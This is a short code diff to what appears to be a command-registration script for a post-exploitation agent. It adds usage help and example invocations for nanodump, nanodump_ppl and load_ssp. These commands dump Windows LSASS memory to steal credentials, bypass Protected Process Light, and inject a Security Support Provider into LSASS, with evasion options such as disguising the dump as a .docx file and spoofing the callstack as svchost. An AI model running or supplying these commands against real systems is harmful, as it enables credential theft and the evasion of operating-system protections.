@@ -467,6 +467,6 @@ def load_ssp(demonID, *params):
 
     return TaskID
 
-RegisterCommand( nanodump, "", "nanodump", "Dump the LSASS process", 0, "", "" )
-RegisterCommand( nanodump_ppl, "", "nanodump_ppl", "Bypass PPL and dump LSASS", 0, "", "" )
-RegisterCommand( load_ssp, "", "load_ssp", "Load a Security Support Provider (SSP) into LSASS", 0, "", "" )
+RegisterCommand( nanodump, "", "nanodump", "Dump the LSASS process", 0, "nanodump [--write C:\\Windows\\Temp\\doc.docx] [--valid] [--duplicate] [--elevate-handle] [--duplicate-elevate] [--seclogon-leak-local] [--seclogon-leak-remote C:\\Windows\\notepad.exe] [--seclogon-duplicate] [--spoof-callstack svchost] [--silent-process-exit C:\\Windows\\Temp] [--shtinkering] [--fork] [--snapshot] [--getpid] [--help]", "nanodump -w c:\\windows\\Temp\\test.txt" )
+RegisterCommand( nanodump_ppl, "", "nanodump_ppl", "Bypass PPL and dump LSASS", 0, "nanodump_ppl --write C:\\Windows\\Temp\\doc.docx [--valid] [--duplicate] [--help]", "nanodump_ppl -w c:\\windows\\Temp\\test.txt" )
+RegisterCommand( load_ssp, "", "load_ssp", "Load a Security Support Provider (SSP) into LSASS", 0, "load_ssp <SSP path>", "load_ssp C:\\Windows\\Temp\\nanodump_ssp.x64.dll" )
